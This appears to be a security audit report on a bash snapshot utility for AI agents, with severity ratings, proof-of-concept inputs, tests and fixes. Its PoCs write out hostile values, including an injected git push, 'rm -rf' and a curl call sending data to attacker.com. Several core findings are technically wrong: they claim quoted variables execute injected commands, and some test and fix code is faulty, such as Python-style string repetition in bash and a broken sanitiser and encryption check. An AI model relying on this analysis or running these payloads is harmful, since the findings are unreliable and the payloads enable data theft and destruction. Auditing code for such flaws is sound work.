# Vulnerability Reference Guide
## Detailed Technical Analysis with Proof-of-Concept

**Purpose**: Detailed technical specification of each finding for developers implementing fixes
**Format**: CWE-based classification with PoC and validation criteria

---

## P0-1: Improper Neutralization of Special Elements in Command (CWE-78)

### Vulnerability Details
```
CWE: CWE-78 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
CVSS v3.1: 9.0 (Critical)
OWASP: A03:2021 - Injection
HIPAA Impact: §164.312(b) - Audit Controls (compromised)
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 123-126, 135-139

```bash
# VULNERABLE CODE
git commit -m "Pre-$agent_name checkpoint: Auto-commit for safety

$reason
Snapshot: $snapshot_name
Timestamp: $(date)" || {
```

### Root Cause
- Variable `$agent_name` is not quoted
- Git interprets special characters as command separators
- Allows injection of arbitrary git commands

### Proof of Concept

**Attack Scenario 1**: Push malicious code
```bash
# Attacker provides:
agent_name='repo"; git push -u origin malicious-branch #'

# Results in execution of:
git commit -m "Pre-repo"; git push -u origin malicious-branch #..."

# Effect: Unauthorized push to repository
```

**Attack Scenario 2**: Reset repository
```bash
# Attacker provides:
agent_name='exploit$(git reset --hard 1234567)test'

# Results in:
git commit -m "Pre-exploit$(git reset --hard 1234567)test checkpoint..."

# Effect: Repository state corrupted, commits lost
```

**Attack Scenario 3**: Exfiltrate data
```bash
# Attacker provides:
agent_name='test"; curl http://attacker.com/steal?data=$(git config user.name) #'

# Results in:
git commit -m "Pre-test"; curl http://attacker.com/steal?data=... #

# Effect: User credentials exfiltrated
```

### Why Current Code is Vulnerable
1. No input validation on `$agent_name`
2. No quoting of variables in git message
3. Shell interprets `$(...) and `` as command substitution
4. No escaping of special git metacharacters

### Validation Criteria (After Fix)
```bash
# Test 1: Injection attempts should fail or be safely escaped
agent_name='test"; git push -u origin pwned #'
auto_create_snapshot "$agent_name" || exit_code=$?
# Must fail with exit code 1, not execute push

# Test 2: Valid names should work
auto_create_snapshot "valid-name" || exit 1
# Should succeed

# Test 3: Special characters should be escaped
agent_name='test&name'
# Should either fail or safely escape the &

# Test 4: Empty names should fail
agent_name=''
auto_create_snapshot "$agent_name" || exit_code=$?
# Must fail validation
```

### Remediation
```bash
# FIXED CODE
git commit \
    -m "Pre-${agent_name} checkpoint: Auto-commit for safety" \
    -m "Reason: ${reason}" \
    -m "Snapshot: ${snapshot_name}" \
    -m "Timestamp: $(date)" || {
    echo -e "${RED}✗ Failed to commit changes${NC}"
    return 1
}

# Why this is safer:
# 1. Multiple -m flags = single quoted argument
# 2. ${var} syntax prevents word splitting
# 3. Git receives literal string, no parsing of shell syntax
# 4. Input validation ensures agent_name is alphanumeric
```

---

## P0-2: Branch Name Command Injection (CWE-78)

### Vulnerability Details
```
CWE: CWE-78 - OS Command Injection
CVSS v3.1: 9.1 (Critical)
Related to P0-1 but specific to git checkout
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 151, 156

```bash
# VULNERABLE CODE - Line 151
git checkout -b "snapshot/$snapshot_name" || {
    echo -e "${RED}✗ Failed to create snapshot branch${NC}"
    return 1
}

# VULNERABLE CODE - Line 156
git checkout "$current_branch" || {
```

### Root Cause
- `$snapshot_name` (derived from untrusted `$agent_name`) used in branch name
- Git allows executing hooks during branch operations
- Hooks could be compromised

### Proof of Concept

**Attack**: Inject branch name with spaces/special chars
```bash
# Attacker provides:
agent_name='test$(rm -rf /tmp/important)test'
snapshot_name="before-test$(rm -rf /tmp/important)test-20250123-143022"

# Results in:
git checkout -b "snapshot/before-test$(rm -rf /tmp/important)test-20250123-143022"

# Git might:
# 1. Execute the command substitution
# 2. Create invalid branch name causing silent failure
# 3. Trigger hooks with modified environment
```

### Why Current Code is Vulnerable
1. `$snapshot_name` includes `$agent_name`
2. No validation of branch name format
3. Git command could be intercepted by hooks
4. No error checking if branch name is invalid

### Validation Criteria (After Fix)
```bash
# Test 1: Invalid characters rejected
agent_name='test;echo;hacked'
# Must fail validation before git command

# Test 2: Command substitution not executed
agent_name='test$(touch /tmp/pwned)test'
# File /tmp/pwned should NOT be created

# Test 3: Branch creation succeeds with valid input
agent_name='valid-agent-name'
# Must create valid branch

# Test 4: Long names handled safely
agent_name='a' * 100  # 100 character name
# Must be truncated and validated
```

### Remediation
```bash
# ADD VALIDATION FUNCTION
validate_snapshot_name() {
    local name="$1"

    # Check format: alphanumeric, hyphens, underscores only
    # Max 100 characters (git ref limit is ~256 bytes)
    if [[ ! $name =~ ^[a-zA-Z0-9_-]{1,100}$ ]]; then
        echo "ERROR: Invalid snapshot name: $name" >&2
        return 1
    fi

    return 0
}

# USE IN BRANCH CHECKOUT
validate_snapshot_name "$snapshot_name" || return 1

git checkout -b "snapshot/$snapshot_name" || {
    echo -e "${RED}✗ Failed to create snapshot branch${NC}"
    return 1
}
```

---

## P0-3: Markdown Injection in Audit Logs (CWE-94)

### Vulnerability Details
```
CWE: CWE-94 - Improper Control of Generation of Code ('Code Injection')
CWE: CWE-116 - Improper Encoding or Escaping of Output
CVSS v3.1: 8.8 (Critical)
Impact: Audit trail tampering, integrity compromise
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 228-240

```bash
# VULNERABLE CODE
cat >> "$AGENTS_MD_PATH" << EOF

### [$timestamp] $snapshot_name
- **Type**: $snapshot_type
- **Commit**: $commit_hash
- **Branch**: $current_branch
- **Reason**: $reason
- **Agent**: $agent_name
- **Files changed**: $file_stats
- **Restoration**: \`$restore_cmd\`
- **Auto-created**: Yes

EOF
```

### Root Cause
- User-provided `$reason` and `$agent_name` written unescaped to markdown file
- Attacker can inject markdown syntax or content
- Audit log becomes unreliable

### Proof of Concept

**Attack Scenario 1**: Inject false entries
```bash
reason='Fixed bug
[FAKE ENTRY]
### [20250122-999999] Unauthorized rollback
- **Type**: hard reset
- **Commits affected**: 50
[END FAKE ENTRY]'

# Results in agents.md containing fake audit entry
# Auditor might see false history of operations
```

**Attack Scenario 2**: Modify interpretation
```bash
reason='Fixed bug
# This line appears to be a comment
But actually it is part of reason
```

agent_name='test](http://attacker.com/xss)'

# Results in markdown link to external site
# If agents.md is rendered as HTML:
# <a href="http://attacker.com/xss">test</a>
```

**Attack Scenario 3**: Hide changes
```bash
reason='
<style>
.snapshot { display: none; }
</style>
'
# If HTML rendering: all snapshots hidden from view
```

### Why Current Code is Vulnerable
1. No HTML/markdown escaping
2. User content written directly to markdown
3. No validation of content type
4. Markdown is processed as executable format

### Validation Criteria (After Fix)
```bash
# Test 1: Markdown syntax escaped
reason='### Injected Title'
# Should become: \#\#\# Injected Title
# Not: ### Injected Title

# Test 2: Brackets escaped
reason='[link](http://attacker.com)'
# Should become: \[link\]\(http://attacker.com\)

# Test 3: Backticks escaped
reason='`code injection`'
# Should become: \`code injection\`

# Test 4: Multiple lines handled
reason='Line 1
Line 2
Line 3'
# Should preserve line breaks but escape markdown
```

### Remediation
```bash
# SANITIZATION FUNCTION
sanitize_for_markdown() {
    local input="$1"

    # Escape backslashes first (prevents double escaping)
    input="${input//\\/\\\\}"

    # Escape markdown special characters
    input="${input//\[/\\[}"          # [
    input="${input//\]/\\]}"          # ]
    input="${input//\(/\\(}"          # (
    input="${input//\)/\\)}"          # )
    input="${input//#/\\#}"           # #
    input="${input//**/\\*\\*}"       # **
    input="${input//\`/\\`}"          # `
    input="${input//~/\\~}"           # ~

    # Remove or replace problematic characters
    input="${input//$'\r'/}"           # Remove carriage returns

    echo "$input"
}

# USE IN AUDIT LOGGING
safe_reason=$(sanitize_for_markdown "$reason")
safe_agent=$(sanitize_for_markdown "$agent_name")

cat >> "$AGENTS_MD_PATH" << EOF

### [$timestamp] $snapshot_name
- **Type**: $snapshot_type
- **Reason**: $safe_reason
- **Agent**: $safe_agent

EOF
```

---

## P0-4: Missing Input Validation (CWE-20)

### Vulnerability Details
```
CWE: CWE-20 - Improper Input Validation
CVSS v3.1: 8.6 (Critical)
Impact: DoS, malformed data, silent failures
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 109-111

```bash
# VULNERABLE CODE
auto_create_snapshot() {
    local agent_name="$1"      # No validation
    local snapshot_type="${2:-tag}"  # No validation
    local reason="${3:-Auto-snapshot before $agent_name execution}"  # No validation
```

### Root Cause
- No validation of parameter format, length, or content
- No type checking of snapshot_type
- No length limits on reason
- Functions fail silently on invalid input

### Proof of Concept

**Attack Scenario 1**: Excessive length DoS
```bash
agent_name='a' * 10000  # 10,000 character string

# Results in:
# 1. Git command with extremely long argument
# 2. Out of memory error
# 3. Undefined behavior
# 4. Potential crash
```

**Attack Scenario 2**: Invalid snapshot type
```bash
snapshot_type='malicious'

# Results in:
# case statement doesn't match any option
# Falls through to invalid type handler
# May attempt to execute invalid command
```

**Attack Scenario 3**: Reason with max length violation
```bash
reason=$(printf 'a%.0s' {1..5000})  # 5000 character reason

# Results in:
# 1. Git message exceeds size limits
# 2. Silent failure (no error message to user)
# 3. Snapshot not created but function returns success
# 4. User unaware of failure
```

### Why Current Code is Vulnerable
1. No length validation
2. No format validation
3. No enum validation for snapshot_type
4. No type checking
5. Functions don't verify parameter validity

### Validation Criteria (After Fix)
```bash
# Test 1: agent_name format validation
# Valid: alphanumeric, hyphens, underscores
# Valid examples: my-agent, agent_1, AGENT123
# Invalid examples: agent@, agent!, agent$

agent_name='invalid!@#'
auto_create_snapshot "$agent_name" && exit 1  # Must fail

# Test 2: Length validation
agent_name=$'a' * 51  # 51 chars, max is 50
auto_create_snapshot "$agent_name" && exit 1  # Must fail

# Test 3: snapshot_type enum validation
snapshot_type='invalid'
auto_create_snapshot 'test' "$snapshot_type" && exit 1  # Must fail

# Test 4: reason length validation
reason=$'a' * 201  # 201 chars, max is 200
auto_create_snapshot 'test' 'tag' "$reason" && exit 1  # Must fail
```

### Remediation
```bash
auto_create_snapshot() {
    local agent_name="$1"
    local snapshot_type="${2:-tag}"
    local reason="${3:-Auto-snapshot before $agent_name execution}"

    # VALIDATION 1: agent_name format and length
    if [[ -z "$agent_name" ]]; then
        echo "ERROR: agent_name cannot be empty" >&2
        return 1
    fi

    if [[ ! $agent_name =~ ^[a-zA-Z0-9_-]{1,50}$ ]]; then
        echo "ERROR: agent_name invalid format or length" >&2
        echo "  Must be 1-50 alphanumeric characters, hyphens, underscores" >&2
        return 1
    fi

    # VALIDATION 2: snapshot_type enum
    if [[ ! $snapshot_type =~ ^(tag|branch|full)$ ]]; then
        echo "ERROR: snapshot_type must be one of: tag, branch, full" >&2
        return 1
    fi

    # VALIDATION 3: reason length
    if [[ ${#reason} -gt 200 ]]; then
        echo "ERROR: reason exceeds 200 character limit" >&2
        return 1
    fi

    # VALIDATION 4: reason content security
    if [[ $reason =~ (\;|\`|\$\(|eval|exec) ]]; then
        echo "ERROR: reason contains suspicious characters" >&2
        return 1
    fi

    # All validation passed, proceed...
}
```

---

## P0-5: Missing Error Handling in Critical Operations (CWE-252)

### Vulnerability Details
```
CWE: CWE-252 - Uncaught Exception
CWE: CWE-391 - Unchecked Error Condition
CVSS v3.1: 8.4 (Critical)
Impact: Silent failures, data loss, integrity loss
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 31, 120, 214

```bash
# VULNERABLE CODE - Line 31
recent_snapshot=$(git tag -l "snapshot-*" --sort=-creatordate \
    --format='%(creatordate:unix) %(refname:short)' 2>/dev/null | head -n 1)
# If git fails, recent_snapshot is empty - indistinguishable from "no snapshots"

# VULNERABLE CODE - Line 120
if [[ -n $(git status --porcelain) ]]; then
    # If git status fails (repo corruption), this is still true
    # Could attempt commit on corrupted repo

# VULNERABLE CODE - Line 214
file_stats=$(git diff --stat "$last_snapshot" HEAD 2>/dev/null | tail -n 1 || echo "Initial snapshot")
# If git diff fails, "$last_snapshot" ref might be invalid
# User unaware that stats are fake
```

### Root Cause
- Git commands don't verify exit codes
- Error output redirected to /dev/null (silently discarded)
- `||` fallback provides default even on real errors
- Caller cannot distinguish "no snapshots" from "git failed"

### Proof of Concept

**Attack Scenario 1**: Corrupted repository undetected
```bash
# Simulate: Repository .git/index is corrupted
# User calls check_recent_snapshot()

# Current behavior:
# 1. git tag -l fails (exit code != 0)
# 2. Error output → /dev/null (hidden)
# 3. recent_snapshot = "" (empty)
# 4. Function returns 1 (no recent snapshot)
# 5. User thinks "no snapshots exist" and creates new one

# Problem:
# User unaware repository is corrupted
# Snapshot creation might fail for hidden reason
# Audit trail shows false snapshot creation
```

**Attack Scenario 2**: Commit fails silently
```bash
# Simulate: Disk full during commit
# User calls auto_create_snapshot()

# Current behavior:
# 1. if [[ -n $(git status --porcelain) ]] is true
# 2. git commit is attempted
# 3. Disk full error (exit code != 0)
# 4. Error message shown: "✗ Failed to commit changes"
# 5. Function returns 1
# 6. Snapshot not created

# But then:
# Function continues to tag creation
# Tags might succeed (metadata only)
# User thinks snapshot was created (tag exists)
# But actual code wasn't snapshotted (no commit)
# Restore will restore tag, not code
```

**Attack Scenario 3**: Stats from wrong commit
```bash
# Simulate: $last_snapshot ref is deleted
# User calls log_snapshot_to_agents_md()

# Current behavior:
# 1. git diff --stat "$last_snapshot" HEAD fails
# 2. 2>/dev/null suppresses error
# 3. Tail gets empty input
# 4. || echo "Initial snapshot" provides fallback
# 5. Audit log shows: "Files changed: Initial snapshot"

# Problem:
# Auditor thinks this is first snapshot
# But it's not - logs are corrupted
# Audit trail integrity compromised
```

### Why Current Code is Vulnerable
1. Exit codes not captured
2. Error output silently discarded with `2>/dev/null`
3. Fallback values (`||`) mask real errors
4. Caller has no way to detect errors
5. No logging of actual failures

### Validation Criteria (After Fix)
```bash
# Test 1: Git command failure detected
# Simulate: git tag -l fails
# Result: Function returns distinct error code
check_recent_snapshot
case $? in
    0) echo "Recent snapshot found" ;;
    1) echo "No recent snapshot" ;;
    2) echo "Git command failed" ;;  # MUST be distinct
esac

# Test 2: Real errors vs empty results
# If git fails: Must indicate error (exit 2 or higher)
# If no snapshots exist: Must indicate empty (exit 1)
# Must not confuse the two

# Test 3: Error logging
# When git fails, error must be logged
# User must be informed of actual failure

# Test 4: Validation of parsed values
# After parsing git output, must verify output is valid
# Empty values must trigger error, not silently pass
```

### Remediation
```bash
check_recent_snapshot() {
    local threshold_minutes="${1:-$SNAPSHOT_AGE_THRESHOLD_MINUTES}"

    # Execute git command and capture BOTH output and exit code
    local recent_snapshot git_exit_code
    recent_snapshot=$(git tag -l "snapshot-*" --sort=-creatordate \
        --format='%(creatordate:unix) %(refname:short)' 2>&1)
    git_exit_code=$?

    # EXPLICIT ERROR HANDLING
    if [[ $git_exit_code -ne 0 ]]; then
        echo "ERROR: git tag command failed (exit $git_exit_code)" >&2
        echo "Output: $recent_snapshot" >&2
        return 2  # DISTINCT from "no snapshots" (returns 1)
    fi

    # Get most recent tag
    recent_snapshot=$(echo "$recent_snapshot" | head -n 1)

    # Check for legitimate empty result (no snapshots)
    if [[ -z "$recent_snapshot" ]]; then
        # This is a valid state - no snapshots exist
        return 1
    fi

    # PARSE AND VALIDATE output
    local snapshot_time snapshot_name
    snapshot_time=$(echo "$recent_snapshot" | awk '{print $1}')
    snapshot_name=$(echo "$recent_snapshot" | awk '{print $2}')

    # Verify parsed values are valid
    if [[ -z "$snapshot_time" ]] || [[ -z "$snapshot_name" ]]; then
        echo "ERROR: Failed to parse snapshot information" >&2
        echo "Raw output: $recent_snapshot" >&2
        return 2  # Parsing error (distinct from no snapshots)
    fi

    # Validate snapshot_time is numeric
    if ! [[ "$snapshot_time" =~ ^[0-9]+$ ]]; then
        echo "ERROR: Invalid timestamp format: $snapshot_time" >&2
        return 2
    fi

    # Calculate age and return result
    local current_time age_minutes
    current_time=$(date +%s)
    age_minutes=$(( (current_time - snapshot_time) / 60 ))

    export SNAPSHOT_NAME="$snapshot_name"
    export SNAPSHOT_AGE_MINUTES="$age_minutes"

    if [[ $age_minutes -le $threshold_minutes ]]; then
        return 0  # Recent snapshot exists
    else
        return 1  # Snapshot exists but too old
    fi
}
```

---

## P1-1: Time of Check to Time of Use (TOCTOU) Race Condition (CWE-367)

### Vulnerability Details
```
CWE: CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition
CVSS v3.1: 7.5 (High)
Impact: Snapshot availability guarantee broken
Compliance: HIPAA §164.312(b) - Audit controls compromised
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 26-55, combined with restore operations

### Root Cause
- Check if snapshot exists (Line 31)
- Gap: Snapshot could be deleted here
- Use snapshot (restore operation in external code)
- No guarantee snapshot still exists

### Proof of Concept

**Race Scenario**:
```
Timeline:
T0:  Process A: check_recent_snapshot() called
T1:  Process A: git tag -l finds "snapshot-test-20250122"
T2:  Process A: SNAPSHOT_NAME is set to "snapshot-test-20250122"
T3:  Process A: returns 0 (snapshot found)
T4:  Process B: /snapshot --cleanup runs
T5:  Process B: git tag -d snapshot-test-20250122 (deletes snapshot)
T6:  Process A: User calls /snapshot --restore snapshot-test-20250122
T7:  Process A: git checkout tags/snapshot-test-20250122 FAILS
T8:  Error: "pathspec 'tags/snapshot-test-20250122' did not match any files"

Result:
- User thinks snapshot exists (checked at T1-T3)
- But snapshot was deleted between check and use (T4-T5)
- Restore fails with cryptic error message
- HIPAA audit control violated (cannot guarantee restore)
```

### Why This Is a Problem
1. HIPAA §164.312(b): Audit controls require ability to restore
2. User checks snapshot exists
3. User proceeds with risky operation assuming rollback available
4. Snapshot deleted by concurrent cleanup or manual operation
5. Rollback fails when needed

### Validation Criteria (After Fix)
```bash
# Test 1: Concurrent deletion detection
# Create snapshot
# Delete it concurrently
# Restore must fail with clear error (not cryptic git error)

# Test 2: Atomic operations
# Check existence AND use must happen atomically
# No gap where snapshot could be deleted

# Test 3: Clear error messages
# If snapshot is missing, error must say "snapshot not found"
# Not "pathspec ... did not match"
```

### Remediation
```bash
# SOLUTION: Atomic check-and-use pattern

restore_snapshot_safely() {
    local snapshot_name="$1"

    # ATOMIC: Check if snapshot exists
    # by attempting to access it, not checking first
    if ! git rev-parse "snapshot-$snapshot_name" >/dev/null 2>&1; then
        # Try as branch reference
        if ! git show-ref --heads "snapshot/$snapshot_name" >/dev/null 2>&1; then
            echo "ERROR: Snapshot not found: $snapshot_name" >&2
            echo "Snapshot may have been deleted or cleaned up" >&2
            return 1
        fi
    fi

    # IMMEDIATE USE: Restore right after verification
    # Minimal window for deletion
    if git show-ref --tags "snapshot-$snapshot_name" >/dev/null 2>&1; then
        git checkout "snapshot-$snapshot_name" || {
            echo "ERROR: Failed to restore snapshot" >&2
            return 1
        }
    elif git show-ref --heads "snapshot/$snapshot_name" >/dev/null 2>&1; then
        git checkout "snapshot/$snapshot_name" || {
            echo "ERROR: Failed to restore snapshot" >&2
            return 1
        }
    else
        # Double-check in case of race condition
        echo "ERROR: Snapshot was deleted during restoration" >&2
        return 1
    fi

    echo "Successfully restored: $snapshot_name"
    return 0
}
```

---

## P1-2: Missing User Attribution (CWE-778)

### Vulnerability Details
```
CWE: CWE-778 - Insufficient Logging
CVSS v3.1: 7.2 (High)
Compliance: HIPAA §164.312(a) - Access Control (user identification)
Impact: Cannot determine who performed operations
```

### Affected Code
**File**: `.claude/lib/snapshot-utils.sh`
**Lines**: 228-240

```bash
# VULNERABLE: No user information in audit log
cat >> "$AGENTS_MD_PATH" << EOF

### [$timestamp] $snapshot_name
- **Type**: $snapshot_type
- **Commit**: $commit_hash
# MISSING: - **Created By**: [user info]
# MISSING: - **User ID**: [actual user]
# MISSING: - **Source**: [where called from]
```

### Root Cause
- Audit log doesn't include WHO created the snapshot
- No user identification
- Cannot track operations to responsible person
- Violates HIPAA requirement for user attribution

### Proof of Concept

**Scenario: Who deleted the snapshot?**
```
agents.md shows:
### [20250122-143022] pre-optimization
- **Type**: branch

And later:
### [20250122-150000] Cleanup
(entries showing deletion)

But we don't know:
- Who created pre-optimization?
- Who ran cleanup?
- Were they authorized?
- Can we hold them accountable?
```

### Why This Is a Problem
1. HIPAA §164.312(a): Requires unique user identification
2. SOC 2 TSC CC6.2: Requires linking actions to users
3. Cannot prove who changed what
4. Audit trail loses legal validity
5. Cannot hold users accountable

### Validation Criteria (After Fix)
```bash
# Test 1: User attribution always present
snapshot_name='test-snapshot'
# Audit log must show:
# - **Created By**: [actual username]
# - **User ID**: [UID]
# - **Time**: [ISO 8601 timestamp]

# Test 2: Identifies actual user (not just 'claude')
# If run via sudo, use SUDO_USER
# If run directly, use $(whoami)
# Must get actual user, not script name

# Test 3: Datetime precision
# Must include seconds and timezone
# Format: 2025-11-23T12:00:00Z (ISO 8601)
```

### Remediation
```bash
log_snapshot_to_agents_md() {
    local snapshot_name="$1"
    local snapshot_type="$2"
    local reason="$3"
    local agent_name="$4"

    # GET USER INFORMATION
    local user_id="${SUDO_USER:-$(whoami)}"
    local user_full=$(getent passwd "$user_id" 2>/dev/null | cut -d: -f5 || echo "unknown")
    local uid=$(id -u "$user_id" 2>/dev/null || echo "unknown")

    # ... validation ...

    # APPEND WITH FULL USER ATTRIBUTION
    cat >> "$AGENTS_MD_PATH" << EOF

### [$timestamp] $snapshot_name
- **Type**: $snapshot_type
- **Commit**: $commit_hash
- **Branch**: $current_branch
- **Created By**: $user_id ($user_full)
- **User ID**: $uid
- **Timestamp**: $(date -u +%Y-%m-%dT%H:%M:%SZ)
- **Reason**: $reason
- **Agent**: $agent_name
- **Files changed**: $file_stats
- **Restoration**: \`$restore_cmd\`
- **Audit Status**: LOGGED

EOF
}
```

---

## P1-3: Unencrypted Sensitive Data in Backups (CWE-327)

### Vulnerability Details
```
CWE: CWE-327 - Use of a Broken or Risky Cryptographic Algorithm
CWE: CWE-315 - Cleartext Storage of Sensitive Information in a Cookie
CVSS v3.1: 7.8 (High)
Compliance: HIPAA §164.312(e) - Transmission Security
Impact: PHI exposure in backup files
```

### Affected Code
**File**: `.claude/agents/snapshot.md`
**Lines**: 210-217

```bash
# VULNERABLE: No encryption of backup bundles
git bundle create "$BUNDLE_PATH" --all
# Backup file contains unencrypted repository data
# If repository contains PHI, backup contains unencrypted PHI
```

### Root Cause
- Git bundle creates plain text archive of repository
- No encryption applied
- Backup files stored in ~/ai-workspace/backups/
- If PHI is in repository, backup contains unencrypted PHI
- Backup could be copied without detection

### Proof of Concept

**PHI Exposure Scenario**:
```bash
# Repository contains patient data:
# patients.json with PHI (names, DOBs, SSNs)

# Admin creates backup:
git bundle create ~/ai-workspace/backups/snapshot-backup-20250122.bundle --all

# Backup file now contains:
# - patient.json in plain text
# - All git history with PHI
# - Anyone with file access can read PHI

# Attacker could:
# 1. Copy backup file undetected
# 2. Extract repository from bundle
# 3. Read all patient data (PHI breach)
# 4. No encryption to prevent this
```

### Why This Is a Problem
1. HIPAA §164.312(e): Requires encryption for sensitive data
2. HIPAA §164.308(a)(3): Data must be encrypted at rest
3. Backup breach = HIPAA violation + fines
4. $100-$50,000 per violation, up to $1.5M per year
5. Breach notification required (state law requirements)

### Validation Criteria (After Fix)
```bash
# Test 1: Backup file is encrypted
# Create bundle
# Verify: Bundle file contents are binary, not git objects

# Test 2: Decryption key required
# Without key, bundle cannot be extracted
# `git bundle unbundle` must fail without decryption

# Test 3: Strong encryption used
# Minimum: AES-256 with secure key derivation
# Verify: OpenSSL enc -aes-256-cbc or equivalent

# Test 4: Encrypted restore works
# Create encrypted bundle
# Decrypt and restore from it
# Result must be identical to original
```

### Remediation
```bash
# ENCRYPT BACKUPS with OpenSSL

create_encrypted_backup() {
    local bundle_path="$1"
    local backup_dir="$HOME/ai-workspace/backups"
    mkdir -p "$backup_dir"

    # Generate encryption key (should come from secure storage)
    # In production: Load from key management service (AWS KMS, etc.)
    local encryption_key="${SNAPSHOT_ENCRYPTION_KEY:?ERROR: SNAPSHOT_ENCRYPTION_KEY not set}"

    # Create bundle and pipe through encryption
    git bundle create - --all | \
        openssl enc -aes-256-cbc -salt -out "$bundle_path" \
        -pass pass:"$encryption_key" || {
        echo "ERROR: Failed to create encrypted backup" >&2
        return 1
    }

    # Verify encryption succeeded
    if ! openssl enc -d -aes-256-cbc -in "$bundle_path" \
         -pass pass:"$encryption_key" -P >/dev/null 2>&1; then
        echo "ERROR: Encrypted backup verification failed" >&2
        rm "$bundle_path"
        return 1
    fi

    echo "Encrypted backup created: $bundle_path"
    return 0
}

# DECRYPT AND RESTORE from encrypted backup
restore_from_encrypted_backup() {
    local bundle_path="$1"
    local encryption_key="${SNAPSHOT_ENCRYPTION_KEY:?ERROR: SNAPSHOT_ENCRYPTION_KEY not set}"

    # Decrypt and unbundle
    openssl enc -d -aes-256-cbc -in "$bundle_path" \
        -pass pass:"$encryption_key" | \
        git bundle unbundle || {
        echo "ERROR: Failed to restore from encrypted backup" >&2
        return 1
    }

    echo "Successfully restored from encrypted backup"
    return 0
}
```

---

## Summary Table

| Finding | CWE | CVSS | Lines | Mitigation |
|---------|-----|------|-------|-----------|
| P0-1 Command Injection | CWE-78 | 9.0 | 123-139 | Quote variables, input validation |
| P0-2 Branch Name Injection | CWE-78 | 9.1 | 151,156 | Format validation, name sanitization |
| P0-3 Markdown Injection | CWE-94 | 8.8 | 228-240 | Escape special characters |
| P0-4 Missing Validation | CWE-20 | 8.6 | 109-111 | Add comprehensive input checks |
| P0-5 Error Handling | CWE-252 | 8.4 | 31,120,214 | Capture exit codes, validate output |
| P1-1 TOCTOU Race | CWE-367 | 7.5 | 26-55 | Atomic check-and-use |
| P1-2 Missing Audit | CWE-778 | 7.2 | 228-240 | Add user attribution |
| P1-3 Unencrypted Backup | CWE-327 | 7.8 | 210-217 | Encrypt with AES-256 |

---

**END OF VULNERABILITY REFERENCE**
